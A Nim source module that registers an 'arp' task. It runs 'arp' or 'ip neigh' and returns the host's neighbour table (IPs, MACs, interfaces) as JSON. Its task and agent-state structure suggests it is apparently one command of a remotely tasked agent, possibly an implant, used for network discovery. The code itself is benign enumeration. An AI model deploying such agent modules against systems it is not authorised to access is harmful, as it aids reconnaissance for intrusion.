import std/[json, osproc, strutils]
import core/types
import commands/registry

proc parseArpN(raw: string): JsonNode =
  ## Parse `arp -n` (Linux) or `arp -a` (Windows) output.
  result = newJArray()
  for line in raw.splitLines():
    let parts = line.splitWhitespace()
    if parts.len < 3: continue
    if parts[0] in ["Address", "Internet", "Interface:"]: continue
    # Find a MAC-looking field (contains : or -)
    var mac = ""
    for p in parts[1 .. ^1]:
      if ':' in p or ('-' in p and p.len >= 14):
        mac = p
        break
    if mac.len == 0: continue
    let iface = if parts.len >= 5: parts[^1] else: ""
    result.add(%*{"ip": parts[0], "mac": mac, "iface": iface, "state": ""})

proc parseIpNeigh(raw: string): JsonNode =
  ## Parse `ip neigh` output: "IP dev IFACE lladdr MAC STATE"
  result = newJArray()
  for line in raw.splitLines():
    let parts = line.splitWhitespace()
    if parts.len < 2: continue
    var ip, mac, iface, state = ""
    ip = parts[0]
    var i = 1
    while i < parts.len:
      if parts[i] == "dev" and i + 1 < parts.len:
        iface = parts[i + 1]; inc i
      elif parts[i] == "lladdr" and i + 1 < parts.len:
        mac = parts[i + 1]; inc i
      elif i == parts.len - 1:
        state = parts[i]
      inc i
    if mac.len > 0:
      result.add(%*{"ip": ip, "mac": mac, "iface": iface, "state": state})

proc arpExecute(taskId: string, params: JsonNode, state: AgentState,
                send: SendMsg): TaskResult =
  try:
    var entries: JsonNode
    when defined(windows):
      let (raw, _) = execCmdEx("arp -a", options = {poStdErrToStdOut})
      entries = parseArpN(raw)
    else:
      let (raw1, code1) = execCmdEx("arp -n", options = {poStdErrToStdOut})
      if code1 == 0 and raw1.len > 0:
        entries = parseArpN(raw1)
      else:
        let (raw2, _) = execCmdEx("ip neigh", options = {poStdErrToStdOut})
        entries = parseIpNeigh(raw2)
    return TaskResult(
      output:    $(%*{"entries": entries}),
      status:    "success",
      completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initArp*() =
  register("arp", arpExecute)
